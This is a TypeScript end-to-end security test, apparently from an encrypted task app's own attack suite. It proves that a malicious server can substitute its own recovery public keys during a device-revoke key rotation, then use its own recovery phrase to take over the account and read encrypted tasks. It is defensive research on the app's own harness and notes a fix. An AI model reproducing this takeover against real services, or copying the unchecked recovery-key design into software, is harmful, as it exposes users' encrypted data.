/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */

/**
 * A2b — recovery-slot substitution (C9, C2). **Claim C9 NOT upheld for
 * re-anchor: a server lie yields full account takeover.**
 *
 * C9 asserts "recovery-slot re-anchoring (which needs only the public half)
 * cannot be abused for takeover." It can. On every AK rotation that keeps the
 * phrase (e.g. a device revoke), the rotating device calls `readStoredRecoveryPlan`
 * (src/services/encryption.ts), which reads `recovery_ecdh_public_key` /
 * `recovery_mlkem_public_key` straight from server metadata and wraps the NEW AK
 * to them — with no out-of-band check, and none is possible (the re-anchoring
 * device does not hold the phrase). The backend `/encryption/rotate` accepts
 * whatever recovery keys the client submits (`assertRecoveryCoverage` only checks
 * presence; the handler comment even calls different keys "the explicit
 * phrase-change path"). So a malicious server that swaps the recovery public keys
 * it serves during a silent re-anchor redirects the recovery slot to a keypair
 * IT chose.
 *
 * This spec proves takeover end to end with the app's own recovery flow: the
 * attacker mints a phrase, derives its keypair under the account's real
 * `kdf_salt`, injects the public halves during a revoke re-anchor, then recovers
 * on a fresh device with that phrase and reads the victim's encrypted task.
 *
 * If Phase 5 pins the recovery key (compare against a locally-cached copy, or
 * have the backend reject a recovery-key change on a non-phrase-change rotate),
 * flip the final assertion — the attacker recovery must be rejected.
 *
 * Requires the PowerSync + Postgres harness. Run with:
 *   bash scripts/run-e2ee-powersync.sh attacks/recovery-slot-substitution.spec.ts
 */

import { expect, test } from '../fixtures'
import {
  getEncryptionServerSnapshot,
  getKdfSalt,
  getTaskIds,
  waitForConsumedChallenge,
  waitForDeviceState,
  waitForEncryptedSetting,
  waitForNewEncryptedTasks,
  waitForUserId,
} from '../db'
import {
  completeFirstDeviceSetup,
  createE2eeEmail,
  createIsolatedDevice,
  createTask,
  enableTasks,
  finishAdditionalDeviceSetup,
  getDeviceId,
  loginViaConsumerOtp,
  overrideEncryptionMetadata,
  revokeTrustedDevice,
  startAdditionalDeviceSetup,
  trustAdditionalDevice,
  waitForTasksPreference,
} from '../helpers'
import {
  deriveRecoveryKeyPairFromSeed,
  encodeRecoverySeed,
  generateRecoverySeed,
} from '../../../src/crypto/recovery-key'
import { exportMlKemPublicKey, exportPublicKey } from '../../../src/crypto/primitives'

test.describe.serial('A2b — recovery-slot substitution', () => {
  test('a server lying about recovery keys during a re-anchor takes over the account', async ({ browser, page }) => {
    const email = createE2eeEmail()
    const secret = `recovery-takeover-${crypto.randomUUID()}`

    await loginViaConsumerOtp(page, email)
    const userId = await waitForUserId(email)
    await completeFirstDeviceSetup(page)
    await enableTasks(page)
    await waitForEncryptedSetting(userId, 'experimental_feature_tasks')
    const before = await getTaskIds(userId)
    await createTask(page, secret)
    await waitForNewEncryptedTasks(userId, before)

    // The attacker mints a recovery phrase and derives its keypair under the
    // account's REAL kdf_salt — which a malicious server reads freely.
    const kdfSalt = await getKdfSalt(userId)
    const attackerSeed = generateRecoverySeed()
    const attackerPhrase = encodeRecoverySeed(attackerSeed)
    const attackerKeys = await deriveRecoveryKeyPairFromSeed(attackerSeed, kdfSalt)
    const attackerEcdhPublicKey = await exportPublicKey(attackerKeys.ecdhPublicKey)
    const attackerMlkemPublicKey = exportMlKemPublicKey(attackerKeys.mlkemPublicKey)

    const legit = await getEncryptionServerSnapshot(userId)
    expect(legit.recoveryEcdhPublicKey).not.toBe(attackerEcdhPublicKey)

    // Trust a victim device so revoking it triggers a silent re-anchor rotation.
    const victim = await trustAdditionalDevice(browser, page, { email, userId, profile: 'firefox' })

    // The malicious server swaps the recovery public keys it serves to the admin;
    // the re-anchor wraps the NEW AK to the attacker's recovery keypair.
    await overrideEncryptionMetadata(page.context(), {
      recovery_ecdh_public_key: attackerEcdhPublicKey,
      recovery_mlkem_public_key: attackerMlkemPublicKey,
    })

    await revokeTrustedDevice(page, victim.label)
    await waitForConsumedChallenge(userId, 'revoke')
    // The rotation persisted the attacker's recovery slot — a "silent re-anchor"
    // that actually swapped the recovery identity, undetected.
    await expect
      .poll(async () => (await getEncryptionServerSnapshot(userId)).recoveryEcdhPublicKey, { timeout: 30_000 })
      .toBe(attackerEcdhPublicKey)
    await victim.context.close()

    // TAKEOVER: a fresh device recovers with the ATTACKER's phrase (no intercept —
    // the server already holds the attacker recovery slot) and reads the secret.
    const attacker = await createIsolatedDevice(browser, 'safari')
    try {
      await loginViaConsumerOtp(attacker.page, email)
      const dialog = await startAdditionalDeviceSetup(attacker.page)
      const attackerDeviceId = await getDeviceId(attacker.page)
      await dialog.getByRole('button', { name: 'Use my recovery key' }).click()
      const input = dialog.getByPlaceholder('word1 word2 word3 ...')
      await input.fill(attackerPhrase)
      await dialog.getByRole('button', { name: 'Submit' }).click()

      await waitForDeviceState(userId, attackerDeviceId, (state) => state.trusted && state.hasEnvelope)
      await finishAdditionalDeviceSetup(attacker.page)
      await waitForTasksPreference(attacker.page, userId)
      await attacker.page.goto('/tasks')
      await expect(attacker.page.getByText(secret, { exact: true })).toBeVisible({ timeout: 30_000 })
    } finally {
      await attacker.context.close()
    }
  })
})
